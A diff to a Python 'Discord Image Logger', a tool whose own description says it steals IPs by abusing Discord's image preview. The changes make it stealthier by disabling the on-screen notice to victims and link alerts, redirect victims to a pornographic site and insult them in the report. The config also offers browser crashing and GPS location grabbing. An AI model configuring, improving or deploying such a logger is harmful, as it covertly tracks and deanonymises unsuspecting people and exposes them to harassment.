@@ -7,7 +7,7 @@ import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.2"
+__version__ = "v2.3"
 __author__ = "Phobos"
 
 config = {
@@ -22,12 +22,12 @@ config = {
     "color": "0xFF0000", # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work.
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "This browser has been Ip-Logged by Phobos's Image Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
@@ -37,7 +37,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 2, # Prevents bots from triggering the alert
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://rb.gy/1m5m4" # Link to the webpage to redirect to 
+        "page": "Https://Pornhub.com" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -146,7 +146,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Got Rick Rolled!**
+            "description": f"""**A User Got Rick Rolled! What a dumbass**
 
 **Endpoint:** `{endpoint}`
             
